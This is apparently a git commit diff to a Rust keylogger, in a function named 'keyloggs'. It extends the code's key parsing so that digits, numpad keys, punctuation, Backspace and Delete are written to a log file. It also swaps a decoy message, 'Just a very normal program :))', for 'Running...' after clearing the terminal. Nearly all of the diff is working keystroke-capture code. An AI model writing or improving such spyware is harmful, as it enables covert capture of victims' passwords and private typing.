c92eb535fb5f6dbf7114683f539a479818a0b159
(Not) Kearash <kearash@pm.me>
2022-02-10 11:41:37 +0330

    simple parser complete, might be missing something

--- src/lib.rs
+++ src/lib.rs
@@ -31,27 +31,60 @@ pub fn keyloggs() {
         let data = &key.to_string().to_lowercase(); // Default data to log
 
         // Log parser
-        // TODO: Slash, Backslash, numbers
         match key {
-            &Keycode::Enter => file.write(b"\n").expect("Something went wrong while editing the file!"),
-            &Keycode::Space => file.write(b" ").expect("Something went wrong while editing the file!"),
             &Keycode::LShift |
             &Keycode::RShift |
             &Keycode::LControl |
             &Keycode::RControl |
             &Keycode::Escape |
             &Keycode::CapsLock |
-            &Keycode::Meta => {
+            &Keycode::Meta |
+            &Keycode::Backspace |
+            &Keycode::Delete => {
                 let data = "[".to_owned() + &key.to_string() + "]";
                 file.write(data.as_bytes()).expect("Something went wrong while editing the file!")
             }
+            &Keycode::Key0 |
+            &Keycode::Key1 |
+            &Keycode::Key2 |
+            &Keycode::Key3 |
+            &Keycode::Key4 |
+            &Keycode::Key5 |
+            &Keycode::Key6 |
+            &Keycode::Key7 |
+            &Keycode::Key8 |
+            &Keycode::Key9 |
+            &Keycode::Numpad0 |
+            &Keycode::Numpad1 |
+            &Keycode::Numpad2 |
+            &Keycode::Numpad3 |
+            &Keycode::Numpad4 |
+            &Keycode::Numpad5 |
+            &Keycode::Numpad6 |
+            &Keycode::Numpad7 |
+            &Keycode::Numpad8 |
+            &Keycode::Numpad9 => {
+                let data = &key.to_string().chars().last().unwrap();
+                file.write(data.to_string().as_bytes()).expect("Something went wrong while editing the file!")
+            }
+            &Keycode::Enter => file.write(b"\n").expect("Something went wrong while editing the file!"),
+            &Keycode::Space => file.write(b" ").expect("Something went wrong while editing the file!"),
+            &Keycode::Equal => file.write(b"=").expect("Something went wrong while editing the file!"),
+            &Keycode::Minus => file.write(b"-").expect("Something went wrong while editing the file!"),
+            &Keycode::NumpadAdd => file.write(b"+").expect("Something went wrong while editing the file!"),
+            &Keycode::NumpadDivide => file.write(b"/").expect("Something went wrong while editing the file!"),
+            &Keycode::Apostrophe => file.write(b",").expect("Something went wrong while editing the file!"),
+            &Keycode::Slash => file.write(b"/").expect("Something went wrong while editing the file!"),
+            &Keycode::BackSlash => file.write(b"\\").expect("Something went wrong while editing the file!"),
+            &Keycode::Semicolon => file.write(b";").expect("Something went wrong while editing the file!"),
+            &Keycode::LeftBracket => file.write(b"[").expect("Something went wrong while editing the file!"),
+            &Keycode::RightBracket => file.write(b"]").expect("Something went wrong while editing the file!"),
             _ => file.write(data.as_bytes()).expect("Something went wrong while editing the file!"),
         };
 
         // Clearing terminal and showing a message
-        // TODO: Switch to background app
         print!("\x1B[2J\x1B[1;1H");
-        println!("Just a very normal program :))");
+        println!("Running...");
     });
     loop {} // Starts a loop so program doesn't die
 }
